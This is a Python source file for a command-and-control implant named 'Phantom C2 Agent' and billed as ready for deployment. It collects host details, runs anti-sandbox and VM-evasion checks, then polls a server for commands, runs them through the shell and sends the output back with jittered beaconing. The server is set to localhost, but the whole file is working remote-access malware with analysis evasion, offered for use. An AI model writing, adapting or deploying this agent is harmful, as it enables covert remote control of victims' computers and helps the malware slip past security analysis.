#!/usr/bin/env python3
"""
Phantom C2 Agent - Ready for deployment
Connects to your current Flask C2 server with advanced evasion
"""

import requests
import json
import time
import random
import os
import subprocess
import platform
import socket
import sys

class PhantomAgent:
    def __init__(self, server_url="http://localhost:5000"):
        self.server_url = server_url
        self.hostname = socket.gethostname()
        self.username = os.getenv('USER') or os.getenv('USERNAME') or 'unknown'
        self.os_info = platform.system()
        self.session = requests.Session()
        
    def evasion_checks(self):
        """Advanced evasion techniques"""
        print("[+] Executing evasion checks...")
        
        # VM Detection
        vm_indicators = ['vmware', 'virtualbox', 'qemu', 'kvm', 'xen', 'hyper-v']
        hostname_lower = self.hostname.lower()
        for indicator in vm_indicators:
            if indicator in hostname_lower:
                print(f"[!] VM indicator detected: {indicator}")
                time.sleep(random.uniform(30, 60))
                
        # Sandbox Detection
        sandbox_users = ['sandbox', 'malware', 'virus', 'sample', 'test']
        username_lower = self.username.lower()
        for user in sandbox_users:
            if user in username_lower:
                print("[-] Sandbox environment detected. Exiting.")
                sys.exit(0)
                
        # Time-based evasion
        current_hour = time.localtime().tm_hour
        if current_hour < 9 or current_hour > 17:
            print("[!] Outside business hours. Applying delay...")
            time.sleep(random.uniform(10, 30))  # Reduced for testing
            
        print("[+] Evasion checks completed")
        
    def checkin(self):
        """Initial check-in with C2 server"""
        try:
            data = {
                'hostname': self.hostname,
                'username': self.username,
                'ip': self.get_local_ip(),
                'os': self.os_info,
                'time': int(time.time())
            }
            
            response = self.session.post(
                f"{self.server_url}/api/report_status",
                json=data,
                timeout=10
            )
            
            if response.status_code == 200:
                print(f"[+] Check-in successful: {self.hostname}")
                return True
            else:
                print(f"[-] Check-in failed: {response.status_code}")
                
        except Exception as e:
            print(f"[-] Check-in error: {e}")
            
        return False
        
    def get_local_ip(self):
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
            
    def get_tasks(self):
        """Check for new tasks from C2 server"""
        try:
            response = self.session.get(
                f"{self.server_url}/api/get_command",
                params={'hostname': self.hostname},
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                if data and 'command' in data:
                    return data['command']
                    
        except Exception as e:
            print(f"[-] Task retrieval error: {e}")
            
        return None
        
    def execute_command(self, command):
        """Execute system command"""
        try:
            if platform.system() == "Windows":
                result = subprocess.run(
                    f"cmd /c {command}",
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
            else:
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                
            output = result.stdout + result.stderr
            return output if output else "Command executed successfully"
            
        except subprocess.TimeoutExpired:
            return "Command timed out"
        except Exception as e:
            return f"Error executing command: {str(e)}"
            
    def send_output(self, command, output):
        """Send command output back to C2 server"""
        try:
            data = {
                'hostname': self.hostname,
                'command': command,
                'output': output,
                'time': int(time.time())
            }
            
            response = self.session.post(
                f"{self.server_url}/api/report_output",
                json=data,
                timeout=10
            )
            
            if response.status_code == 200:
                print(f"[+] Output sent for command: {command[:50]}...")
                
        except Exception as e:
            print(f"[-] Output send error: {e}")
            
    def heartbeat(self):
        """Send heartbeat to maintain connection"""
        try:
            data = {
                'hostname': self.hostname,
                'time': int(time.time())
            }
            
            response = self.session.post(
                f"{self.server_url}/api/heartbeat",
                json=data,
                timeout=5
            )
            
            return response.status_code == 200
            
        except:
            return False
            
    def run(self):
        """Main agent loop"""
        print("[+] Phantom C2 Agent Starting...")
        
        # Execute evasion checks
        self.evasion_checks()
        
        # Initial check-in
        if not self.checkin():
            print("[-] Initial check-in failed. Exiting.")
            return
            
        print("[+] Agent operational. Entering main loop...")
        
        # Main loop
        sleep_base = 5
        jitter_max = 3
        
        while True:
            try:
                # Check for tasks
                command = self.get_tasks()
                if command:
                    print(f"[+] Received command: {command}")
                    
                    # Handle special commands
                    if command.lower() == 'exit':
                        print("[+] Exit command received. Terminating.")
                        break
                    elif command.lower().startswith('sleep '):
                        try:
                            sleep_base = int(command.split()[1])
                            print(f"[+] Sleep interval updated to {sleep_base} seconds")
                        except:
                            pass
                    elif command.lower().startswith('jitter '):
                        try:
                            jitter_max = int(command.split()[1])
                            print(f"[+] Jitter updated to {jitter_max} seconds")
                        except:
                            pass
                    else:
                        # Execute command
                        output = self.execute_command(command)
                        self.send_output(command, output)
                        
                # Send heartbeat
                self.heartbeat()
                
                # Sleep with jitter
                sleep_time = sleep_base + random.uniform(0, jitter_max)
                time.sleep(sleep_time)
                
            except KeyboardInterrupt:
                print("\n[+] Agent terminated by user")
                break
            except Exception as e:
                print(f"[-] Main loop error: {e}")
                time.sleep(10)

def main():
    # Use local server (your current Flask C2)
    server_url = "http://localhost:5000"
    
    agent = PhantomAgent(server_url)
    agent.run()

if __name__ == "__main__":
    main()